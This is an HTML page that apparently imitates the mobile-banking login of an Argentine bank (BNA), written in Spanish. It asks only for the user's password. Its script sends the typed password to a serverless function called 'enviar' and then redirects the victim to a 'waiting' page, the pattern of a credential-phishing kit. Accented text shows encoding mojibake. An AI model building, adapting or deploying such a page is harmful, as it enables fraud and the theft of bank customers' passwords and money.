<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<!-- Header superior -->
<header class="top-bar">
    <div class="title">Mobile Banking</div>
</header>

<!-- Logo -->
<div class="logo-container">
    <img src="bna.png" alt="Logo">
</div>

<!-- Card login -->
<div class="login-card">
    <div class="login-title">IngresÃ¡ tu clave</div>

    <input
        type="text"
        id="claveInput"
        maxlength="20"
        autocomplete="off"
        placeholder="Clave"
    >

    <button type="button" class="btn-accept" onclick="enviarClave()">
        <span class="check">âœ”</span>
        Aceptar
    </button>
</div>

<!-- Footer -->
<footer class="footer">
    <span class="close">âœ–</span>
    <p>Salir</p>
</footer>

<script>
const claveInput = document.getElementById("claveInput");

/* Solo letras y nÃºmeros â€“ mÃ¡ximo 12 */
claveInput.addEventListener("input", () => {
    claveInput.value = claveInput.value
        .replace(/[^a-zA-Z0-9]/g, "")
        .slice(0, 20);
});

function enviarClave() {
    const clave = claveInput.value.trim();

    if (clave.length === 0) {
        claveInput.focus();
        return;
    }

    fetch("/.netlify/functions/enviar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tipo: "ðŸ”‘ CLAVE",
            valor: clave
        })
    })
    .finally(() => {
        window.location.href = "espera.html";
    });
}
</script>

</body>
</html>
